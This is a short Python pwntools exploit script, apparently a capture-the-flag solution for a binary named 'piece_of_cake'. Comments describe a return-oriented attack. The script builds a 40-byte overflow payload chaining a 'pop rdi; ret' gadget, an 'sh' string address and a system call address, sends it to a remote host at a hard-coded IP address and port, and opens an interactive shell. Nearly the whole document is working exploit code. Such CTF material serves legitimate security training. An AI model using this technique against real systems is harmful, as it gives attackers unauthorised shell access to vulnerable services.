from pwn import *

"""
- find system addr in one hidden function
(i.e. "call system" addr)
- find sh string in binary (not /bin/sh in libc, because offsets might differ)
- use a pop rdi; ret gadget to put sh string in rdi, as first arg of system
"""

io = remote("141.85.224.102", 31337)
# io = process("./piece_of_cake")

offset = 40

system_addr = 0x40064f
sh_addr = 0x40036f
pop_rdi_ret = 0x400723

payload = "A" * offset + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)

io.recv()
io.sendline(payload)
io.interactive()
